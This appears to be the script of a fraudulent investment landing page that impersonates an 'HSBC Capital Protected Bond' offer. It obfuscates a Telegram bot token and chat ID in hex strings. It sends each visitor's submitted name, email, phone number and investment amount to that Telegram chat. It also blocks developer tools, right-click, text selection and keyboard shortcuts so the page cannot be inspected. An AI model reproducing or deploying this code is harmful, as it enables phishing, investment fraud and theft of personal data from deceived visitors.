(function() {
    setInterval(() => {
        const devtools = /./;
        devtools.toString = function() {
            window.location.href = 'about:blank';
        }
        console.log('%c', devtools);
    }, 1000);
    
    if (window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) {
        window.location.href = "about:blank";
    }
})();

document.addEventListener('DOMContentLoaded', function() {
    const carousel = document.querySelector('.carousel');
    const items = document.querySelectorAll('.carousel-item');
    const prevBtn = document.querySelector('.carousel-nav.prev');
    const nextBtn = document.querySelector('.carousel-nav.next');
    
    let currentIndex = 0;
    const itemWidth = items[0].offsetWidth;
    
    function updateCarousel() {
        carousel.style.transform = `translateX(-${currentIndex * itemWidth}px)`;
    }
    
    prevBtn.addEventListener('click', () => {
        if (currentIndex > 0) {
            currentIndex--;
            updateCarousel();
        }
    });
    
    nextBtn.addEventListener('click', () => {
        if (currentIndex < items.length - 1) {
            currentIndex++;
            updateCarousel();
        }
    });

    // scrll func
    const scrollToForm = () => {
        const form = document.querySelector('.investment-form');
        form.scrollIntoView({ behavior: 'smooth', block: 'center' });
    };

    // two buttons only
    const headerButton = document.querySelector('header .btn-secondary');
    const footerButton = document.querySelector('.cta .btn-primary');

    headerButton.addEventListener('click', (e) => {
        e.preventDefault();
        scrollToForm();
    });

    footerButton.addEventListener('click', (e) => {
        e.preventDefault();
        scrollToForm();
    });
    
    const _0x5f2a=['\x71\x75\x65\x72\x79\x53\x65\x6c\x65\x63\x74\x6f\x72','\x2e\x69\x6e\x76\x65\x73\x74\x6d\x65\x6e\x74\x2d\x66\x6f\x72\x6d','\x37\x35\x34\x35\x33\x32\x34\x34\x34\x33\x3a\x41\x41\x45\x53\x75\x39\x52\x73\x79\x35\x79\x62\x77\x6d\x6b\x6e\x38\x41\x5a\x75\x70\x59\x30\x42\x62\x54\x79\x4d\x47\x30\x59\x56\x53\x5f\x73','\x2d\x31\x30\x30\x32\x33\x36\x34\x39\x31\x39\x34\x34\x30'];
    const form=document[_0x5f2a[0]](_0x5f2a[1]);
    const BOT_TOKEN=_0x5f2a[2];
    const CHAT_ID=_0x5f2a[3];

    function isValidPhone(countryCode, phone) {
        const countryCodePattern = /^\+\d{1,4}$/;
        const phonePattern = /^\d{6,14}$/;
        return countryCodePattern.test(countryCode) && phonePattern.test(phone);
    }

    const countryCodeInput = document.getElementById('countryCode');

    countryCodeInput.addEventListener('input', (e) => {
        let value = e.target.value;
        value = value.replace(/\D/g, '');
        value = value.slice(0, 3);
        e.target.value = value;
    });

    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const investment = form.querySelector('select').value;
        const name = form.querySelector('input[type="text"]').value;
        const email = form.querySelector('input[type="email"]').value;
        const countryCode = '+' + document.getElementById('countryCode').value;
        const phoneNumber = document.getElementById('phoneNumber').value;

        if (!investment || !name || !email || !countryCode || !phoneNumber) {
            alert('Please fill in all fields');
            return;
        }

        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailPattern.test(email)) {
            alert('Please enter a valid email address');
            return;
        }

        if (!isValidPhone(countryCode, phoneNumber)) {
            alert('Please enter a valid country code and phone number');
            return;
        }

        const message = `
🔔 New Data

💰 Investment Amount: ${investment}
👤 Full Name: ${name}
📧 Email: ${email}
📱 Phone: ${countryCode}${phoneNumber}

From: HSBC Capital Protected Bond Landing Page
        `.trim();

        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            });

            const data = await response.json();

            if (data.ok) {
                form.reset();
                alert('Thank you for your interest. Our team will contact you shortly with the brochure.');
            } else {
                throw new Error(`Telegram API error: ${data.description}`);
            }
        } catch (error) {
            alert('Something went wrong. Please try again later.');
        }
    });
});

document.addEventListener('contextmenu', (e) => e.preventDefault());
document.addEventListener('selectstart', (e) => e.preventDefault());
document.addEventListener('keydown', (e) => {
    if (e.ctrlKey || e.metaKey) {
        e.preventDefault();
    }
}); 